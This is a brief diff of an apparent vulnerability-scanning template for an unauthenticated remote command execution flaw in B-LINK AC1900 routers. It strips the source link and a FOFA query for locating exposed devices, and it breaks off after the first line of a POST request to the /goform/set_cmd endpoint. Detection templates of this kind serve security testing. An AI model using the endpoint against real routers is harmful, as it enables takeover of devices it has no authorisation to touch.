@@ -3,12 +3,8 @@ info:
   name: B-LINK AC1900 V1.0.2 未授权RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uqvgi2cm5t0l25t8'
+  description: ''
   tags: rce,unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uqvgi2cm5t0l25t8
-    fofa: title=="B-LINK"
 http:
 - raw:
   - 'POST /goform/set_cmd HTTP/1.1
